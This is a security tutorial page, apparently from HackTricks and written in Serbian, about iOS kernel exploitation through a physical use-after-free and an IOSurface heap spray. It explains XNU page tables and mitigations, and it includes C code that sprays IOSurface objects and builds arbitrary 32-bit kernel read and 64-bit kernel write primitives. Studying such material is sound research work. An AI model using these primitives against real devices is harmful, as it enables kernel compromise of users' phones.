# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Fizički use-after-free

Ovo je sažetak posta sa [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html), a dodatne informacije o exploit-u koji koristi ovu tehniku mogu se naći na [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd)

### Upravljanje memorijom u XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

Virtuelni adresni prostor za procese korisnika na iOS-u prostire se od **0x0 do 0x8000000000**. Međutim, ove adrese se ne preslikavaju direktno na fizičku memoriju. Umesto toga, **kernel** koristi **page tables** da prevede virtuelne adrese u stvarne **fizičke adrese**.

#### Nivoi page tabela u iOS-u

Page table-ovi su organizovani hijerarhijski u tri nivoa:

1. **L1 Page Table (Level 1)**:
* Svaki unos ovde predstavlja veliki opseg virtuelne memorije.
* Pokriva **0x1000000000 bytes** (ili **256 GB**) virtuelne memorije.
2. **L2 Page Table (Level 2)**:
* Unos ovde predstavlja manji region virtuelne memorije, konkretno **0x2000000 bytes** (32 MB).
* L1 unos može pokazivati na L2 tabelu ako ne može sam da mapira ceo region.
3. **L3 Page Table (Level 3)**:
* Ovo je najfiniji nivo, gde svaki unos mapira jednu **4 KB** memorijsku stranicu.
* L2 unos može pokazivati na L3 tabelu ako je potrebna detaljnija kontrola.

#### Mapiranje virtuelne u fizičku memoriju

* **Direct Mapping (Block Mapping)**:
* Neki unosi u page tabeli direktno **mapiraju opseg virtuelnih adresa** na kontinualan opseg fizičkih adresa (kao prečica).
* **Pointer to Child Page Table**:
* Ako je potrebna finija kontrola, unos na jednom nivou (npr. L1) može pokazivati na **child page table** na sledećem nivou (npr. L2).

#### Primer: mapiranje virtuelne adrese

Recimo da pokušate da pristupite virtuelnoj adresi **0x1000000000**:

1. **L1 Table**:
* Kernel proverava odgovarajući unos u L1 page tabeli za ovu virtuelnu adresu. Ako ima **pointer** ka L2 page tabeli, prelazi u tu L2 tabelu.
2. **L2 Table**:
* Kernel proverava L2 page tabelu za detaljnije mapiranje. Ako ovaj unos pokazuje na **L3 page table**, prelazi se tamo.
3. **L3 Table**:
* Kernel pregleda finalni L3 unos, koji pokazuje na **fizičku adresu** stvarne memorijske stranice.

#### Primer mapiranja adresa

Ako upišete fizičku adresu **0x800004000** u prvi indeks L2 tabele, onda:

* Virtuelne adrese od **0x1000000000** do **0x1002000000** mapiraju se na fizičke adrese od **0x800004000** do **0x802004000**.
* Ovo je **block mapping** na L2 nivou.

Alternativno, ako L2 unos pokazuje na L3 tabelu:

* Svaka 4 KB stranica u virtuelnom adresnom opsegu **0x1000000000 -> 0x1002000000** bi bila mapirana pojedinačnim unosima u L3 tabeli.

### Physical use-after-free

Physički use-after-free (UAF) se dešava kada:

1. Proces **alokira** neku memoriju kao **readable i writable**.
2. **Page tables** su ažurirane da mapiraju ovu memoriju na specifičnu fizičku adresu kojoj proces može pristupiti.
3. Proces **dealocira** (oslobodi) memoriju.
4. Međutim, zbog **baga**, kernel **zaboravi da ukloni mapiranje** iz page tabela, iako označi odgovarajuću fizičku memoriju kao slobodnu.
5. Kernel zatim može **ponovo alocirati ovu "oslobođenu" fizičku memoriju** za druge svrhe, kao što su **kernel podaci**.
6. Pošto mapiranje nije uklonjeno, proces i dalje može **čitati i pisati** tu fizičku memoriju.

To znači da proces može pristupiti **stranicama kernel memorije**, koje mogu sadržavati osetljive podatke ili strukture, potencijalno omogućavajući napadaču da **manipuliše kernel memorijom**.

### IOSurface Heap Spray

Pošto napadač ne može kontrolisati koje konkretne kernel stranice će biti dodeljene oslobođenoj memoriji, koristi se tehnika zvana **heap spray**:

1. Napadač **kreira veliki broj IOSurface objekata** u kernel memoriji.
2. Svaki IOSurface objekat sadrži **magničnu vrednost** u jednom od svojih polja, što ga čini lakim za identifikaciju.
3. Oni **skeniraju oslobođene stranice** da vide da li je neki od ovih IOSurface objekata dospeo na oslobođenu stranicu.
4. Kada pronađu IOSurface objekat na oslobođenoj stranici, mogu ga iskoristiti za **čitanje i pisanje kernel memorije**.

Više informacija o ovome na [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> Imajte na umu da iOS 16+ (A12+) uređaji uvode hardverske mitigacije (kao što su PPL ili SPTM) koje čine fizičke UAF tehnike znatno manje izvodljivim.
> PPL nameće stroga MMU ograničenja na stranicama vezanim za code signing, entitlements i osetljive kernel podatke, pa čak i ako se stranica ponovo koristi, upisi iz userlanda ili kompromitovanog kernel koda u PPL-zaštićene stranice su blokirani.
> Secure Page Table Monitor (SPTM) proširuje PPL tako što ojačava same page table update-ove. On osigurava da čak ni privilegovani kernel kod ne može neprimetno remapirati oslobođene stranice ili menjati mapiranja bez prolaska kroz sigurnosne provere.
> KTRR (Kernel Text Read-Only Region) zaključava sekciju kernel koda kao samo za čitanje posle boot-a. Ovo sprečava bilo kakve izmene kernel koda u toku rada, zatvarajući jedan od glavnih vektora napada na koji se fizički UAF exploiti često oslanjaju.
> Pored toga, `IOSurface` alokacije su manje predvidljive i teže ih je mapirati u user-accessible regione, što čini trik sa skeniranjem "magične vrednosti" mnogo manje pouzdanim. I `IOSurface` je sada zaštićen entitlements i sandbox ograničenjima.

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: Napadač kreira mnogo IOSurface objekata sa specijalnim identifikatorom ("magic value").
2. **Scan Freed Pages**: Proveravaju da li je neki od objekata alociran na oslobođenoj stranici.
3. **Read/Write Kernel Memory**: Manipulacijom polja u IOSurface objektu, stiču sposobnost da izvode **arbitrary reads and writes** u kernel memoriji. To im omogućava da:
* Iskoriste jedno polje da **čitaju bilo koju 32-bit vrednost** u kernel memoriji.
* Iskoriste drugo polje da **pišu 64-bit vrednosti**, postižući stabilan **kernel read/write primitive**.

Generišite IOSurface objekte sa magičnom vrednošću IOSURFACE\_MAGIC za kasnije pretraživanje:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Pretražite objekte **`IOSurface`** u jednoj oslobođenoj fizičkoj stranici:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### Postizanje čitanja/pisanja u kernelu pomoću IOSurface

Nakon što se uspostavi kontrola nad IOSurface objektom u kernel memoriji (mapiran na oslobođenu fizičku stranicu kojoj korisnički prostor ima pristup), možemo ga iskoristiti za **arbitrary kernel read and write operations**.

**Ključna polja u IOSurface**

IOSurface objekat ima dva ključna polja:

1. **Use Count Pointer**: Omogućava **32-bit read**.
2. **Indexed Timestamp Pointer**: Omogućava **64-bit write**.

Prepisivanjem ovih pokazivača preusmeravamo ih na proizvoljne adrese u kernel memoriji, čime dobijamo mogućnost čitanja/pisanja.

#### 32-Bit Kernel Read

Za izvođenje čitanja:

1. Prepišite **use count pointer** da pokazuje na ciljnu adresu umanjenu za offset od 0x14 bajta.
2. Koristite `get_use_count` method da pročitate vrednost na toj adresi.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Kernel Write

Da biste izvršili upis:

1. Prepišite **indexed timestamp pointer** da pokazuje na ciljnu adresu.
2. Koristite `set_indexed_timestamp` metodu da upišete 64-bitnu vrednost.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Exploit Flow Recap

1. **Trigger Physical Use-After-Free**: Slobodne stranice su dostupne za ponovnu upotrebu.
2. **Spray IOSurface Objects**: Alocirajte mnogo IOSurface objekata sa jedinstvenom "magic value" u kernel memoriji.
3. **Identify Accessible IOSurface**: Pronađite IOSurface na oslobođenoj stranici kojom upravljate.
4. **Abuse Use-After-Free**: Izmenite pokazivače u IOSurface objektu kako biste omogućili proizvoljno **kernel read/write** putem IOSurface metoda.

Sa ovim primitivima, exploit obezbeđuje kontrolisano **32-bit reads** i **64-bit writes** u kernel memoriju. Dalji koraci za jailbreak mogu uključivati stabilnije read/write primitive, koje mogu zahtevati zaobilaženje dodatnih zaštita (npr. PPL na novijim arm64e uređajima).

{{#include ../../banners/hacktricks-training.md}}
